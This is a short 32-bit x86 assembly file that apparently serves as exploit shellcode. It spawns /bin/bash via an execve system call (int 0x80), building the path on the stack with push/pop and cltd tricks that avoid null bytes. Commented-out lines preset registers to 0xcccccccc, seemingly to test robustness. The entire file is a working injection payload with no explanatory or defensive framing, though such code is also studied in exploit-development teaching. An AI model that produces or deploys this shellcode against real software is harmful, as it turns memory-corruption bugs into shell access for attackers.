.code32
.globl _start
.section .text

_start:
	#movl	$0xcccccccc, %eax
	#movl	$0xcccccccc, %ebx
	#movl	$0xcccccccc, %ecx
	#movl	$0xcccccccc, %edx
	#movl	$0xcccccccc, %esi
	#movl	$0xcccccccc, %edi
	#movl	$0xcccccccc, %ebp

	pushl	$11
	popl	%eax				# eax = 11
	cltd						# edx = 0
	pushl	$0x68				# h + null character
	pushl	$0x7361622f			# /bas
	push	$0x6e69622f			# /bin
	movl	%esp, %ebx			# ebx(argv[0]) = "/bin/bash"
	pushl	%edx				# null pointer
	movl	%esp, %edx			# edx(envp) = {NULL}
	pushl	%ebx				# "/bin/bash"
	movl	%esp, %ecx			# ecx(argv) = {"/bin/bash", NULL}
	int		$0x80				# execve("/bin/bash", ["/bin/bash", NULL], [NULL])

